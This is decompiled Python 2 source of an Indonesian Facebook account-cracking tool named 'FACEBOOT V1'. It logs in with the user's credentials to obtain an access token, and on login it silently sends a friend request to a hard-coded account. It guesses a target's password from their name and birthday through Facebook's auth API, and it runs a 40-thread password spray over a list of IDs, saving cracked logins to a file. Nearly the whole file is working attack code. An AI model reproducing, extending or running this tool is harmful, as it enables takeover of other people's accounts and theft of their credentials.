# uncompyle6 version 3.4.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Apr 30 2019, 15:54:43) 
# [GCC 9.0.1 20190312 (Red Hat 9.0.1-0.10)]
# Embedded file name: <seni>
# Compiled at: 2018-02-25 14:25:47
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, marshal
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[91m[\x1b[0m#\x1b[91m] \x1b[0mSAMPAI JUMPA CUK'
    sys.exit()


logo = '\x1b[93m ______             _                 _   \n|  ____|           | |               | |  \n| |__ __ _  ___ ___| |__   ___   ___ | |_ \n|  __/ _` |/ __/ _ \\ `_ \\ / _ \\ / _ \\| __|\n| | | (_| | (_|  __/ |_) | (_) | (_) | |_ \n|_|  \\__,_|\\___\\___|_.__/ \\___/ \\___/ \\__|'
back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
id = []

def login():
    os.system('clear')
    try:
        toket = open('cookie/login.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        print 'Silahkan Login Facebook'
        id = raw_input('\x1b[0mUsername: ')
        pwd = raw_input('\x1b[0mPassword: ')
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\x1b[0m[\x1b[91m!\x1b[0m] Tidak Ada Koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                os.mkdir('cookie')
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                q = hashlib.new('md5')
                q.update(sig)
                a = q.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                s = requests.get(url, params=data)
                u = json.loads(s.text)
                syg = open('cookie/login.txt', 'w')
                syg.write(u['access_token'])
                syg.close()
                print 'Sukses Membuat Akses Token'
                time.sleep(1)
                print 'jangan lupa subscribe channel GUNAWAN ID'
                print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                print 'tunggu...'
                time.sleep(5)
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + u['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\x1b[0m[\x1b[91m!\x1b[0m] Ops Akun Kena CheckPoint'
            os.system('rm -rf cookie')
            time.sleep(1)
            keluar()
        else:
            print '\x1b[0m[\x1b[91m!\x1b[0m] Login Gagal'
            os.system('rm -rf cookie')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('cookie/login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[0m[\x1b[91m!\x1b[0m] Akses Token Tidak Ada'
        os.system('rm -rf cookie')
        time.sleep(1)
        login()
    else:
        try:
            ktl = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            g = json.loads(ktl.text)
            nama = g['name']
            id = g['id']
        except KeyError:
            os.system('clear')
            print 'Akun Cekpoin'
            os.system('rm -rf cookie')
            login()

    os.system('clear')
    os.system('xdg-open https://youtube.com/GUNAWANID')
    print logo
    print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0mSELAMAT DATANG \x1b[92m' + nama
    print '\x1b[0mTOOL : \x1b[0mFACEBOOT V1'
    print '\x1b[0mCODE : \x1b[0mJUNIOR404'
    print '\x1b[0mTEAM : \x1b[0m407 AUTHENTIC EXPLOIT'
    print '\x1b[0mBLOG : www.phreakerlampung.com'
    print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[91m[\x1b[0m1\x1b[91m] \x1b[0mTARGET CRACKING (beta)'
    print '\x1b[91m[\x1b[0m2\x1b[91m] \x1b[0mCRACK LIST ID (PERBAIKAN)'
    print '\x1b[91m[\x1b[0m3\x1b[91m] \x1b[0mAUTO CRACKING V1'
    print '\x1b[91m[\x1b[0m4\x1b[91m] \x1b[0mAUTO CRACKING V2'
    print '\x1b[91m[\x1b[0m5\x1b[91m] \x1b[0mUPDATE TOOLS'
    print '\x1b[91m[\x1b[0m6\x1b[91m] \x1b[0mLOG OUT'
    print '\x1b[91m[\x1b[0m0\x1b[91m] \x1b[0mEXIT DARI SINI'
    pilih()


def pilih():
    kntl = raw_input('\x1b[0mMasukan Nomer: ')
    if kntl == '':
        print '\x1b[0m[\x1b[91m!\x1b[0m] Tidak Boleh Kosong'
        pilih()
    elif kntl == '1' or kntl == '01':
        tc()
    elif kntl == '2' or kntl == '02':
        oke()
    elif kntl == '3' or kntl == '03':
        os.system('python2 scr/ajg.py')
    elif kntl == '4' or kntl == '04':
        os.system('python2 scr/ajk.py')
    elif kntl == '5' or kntl == '05':
        update()
    elif kntl == '6' or kntl == '06':
        os.system('rm -rf cookie')
        keluar()
    elif kntl == '0' or kntl == '00':
        keluar()
    else:
        menu()


def tc():
    os.system('clear')
    try:
        toket = open('cookie/login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91m!\x1b[0m] File Token Tidak Ada Cuk'
        os.system('rm -rf cookie')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        try:
            id = raw_input('\x1b[0m[\x1b[92m*\x1b[0m] Masukan ID Target : ')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[0m[\x1b[92m*\x1b[0m] Cracking Dimulai'
            print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
            pz1 = a['kontol123'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[0m[\x1b[92mBERHASIL\x1b[0m] ' + id + ' | ' + pz1
                raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                menu()
            elif 'www.facebook.com' in y['error_msg']:
                print '\x1b[0m[\x1b[91m-\x1b[0m] Dapet Akun Tapi CheckPoint Cuk'
                print '[ ' + id + ' | ' + pz1 + 'CheckPoint'
                raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                menu()
            else:
                pz2 = a['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = json.load(data)
                if 'access_token' in y:
                    print '\x1b[0m[\x1b[2m+\x1b[0m] Mantap Dapet Akun Cuk'
                    print '[ ' + id + ' |  ' + pz2 + 'Berhasil'
                    raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                    menu()
                elif 'www.facebook.com' in y['error_msg']:
                    print '\x1b[0m[\x1b[91m-\x1b[0m] Dapet Akun Tapi CheckPoint Cuk'
                    print '[ ' + id + ' |  ' + pz2 + 'CheckPoint'
                    raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                    menu()
                else:
                    pz3 = a['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[0m[\x1b[92m+\x1b[0m] Mantap Dapet Akun Cuk'
                        print '[ ' + id + ' |  ' + pz3 + 'Berhasil'
                        raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                        menu()
                    elif 'www.facebook.com' in y['error_msg']:
                        print '\x1b[0m[\x1b[91m-\x1b[0m] Dapet Akun Tapi CheckPoint Cuk'
                        print '[ ' + id + ' |  ' + pz3 + 'CheckPoint'
                        raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                        menu()
                    else:
                        lahir = a['birthday']
                        pz4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = json.load(data)
                        if 'access_token' in y:
                            print '\x1b[0m[\x1b[92m+\x1b[0m] Mantap Dapet Akun Cuk'
                            print '[ ' + id + ' |  ' + pz4 + 'Berhasil'
                            raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                            menu()
                        elif 'www.facebook.com' in y['error_msg']:
                            print '\x1b[0m[\x1b[91m-\x1b[0m] Dapet Akun Tapi CheckPoint Cuk'
                            print '[ ' + id + ' |  ' + pz4 + 'CheckPoint'
                            raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                            menu()
                        else:
                            print '\x1b[0m[\x1b[92m#\x1b[0m] Proses Cracking Selesai Cuk'
                            raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
                            menu()
        except KeyError:
            print '\x1b[0m[\x1b[91m!\x1b[0m] ID Target tidak Dikenal'
            raw_input('\n\x1b[91m[ \x1b[0mTekan Enter Untuk Kembali \x1b[91m]')
            menu()


def cli():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('cookie/login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91m!\x1b[0m] Token tidak ditemukan'
        os.system('rm -rf cookie')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        idlist = raw_input('\x1b[0m[\x1b[92m?\x1b[0m] \x1b[0mList File ID  : ')
        passw = raw_input('\x1b[0m[\x1b[92m?\x1b[0m] \x1b[0mPassword : ')
        try:
            file = open(idlist, 'r')
            for x in range(40):
                cok = threading.Thread(target=otp, args=())
                cok.start()
                threads.append(cok)

            for cok in threads:
                cok.join()

        except IOError:
            print '\x1b[0m[\x1b[91m!\x1b[0m] File tidak ditemukan'
            raw_input('\n\x1b[91m[ \x1b[0mKembali \x1b[91m]')
            menu()


def otp():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[0m[\x1b[92mBERHASIL\x1b[0m] ' + username + ' | ' + passw)
                back += 1
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('Cekpoint.txt', 'w')
                cek.write(username + ' | ' + passw + '\n')
                cek.close()
                cekpoint.append('\x1b[91m[\x1b[0mCHECKPOINT\x1b[0m] ' + username + ' | ' + passw)
                back += 1
            else:
                gagal.append(username)
                back += 1
            sys.stdout.write('\rCrack    : ' + str(back) + ' - ' + str(len(up)) + 'Dapet :' + str(len(berhasil)) + ' - Status :' + str(len(cekpoint)))

    except IOError:
        print '\x1b[0m[\x1b[91m!\x1b[0m] Jaringan Lu Lelet Cuk'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[0m[\x1b[91m!\x1b[0m] Sinyal Lu Lelet Cuk'


def oke():
    print '\x1b[0m[\x1b[91m!\x1b[0m] MAAF FITUR INI MASIH TAHAP PERBAIKAN'
    time.sleep(5)
    print
    menu()


def hasil():
    print
    print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[0m[\x1b[91m!\x1b[0m] Gagal - ' + str(len(gagal))
    keluar()


def update():
    print 'Maaf Versi Terbaru Belum Tersedia'
    keluar()


if __name__ == '__main__':
    login()
# okay decompiling 1.pyc
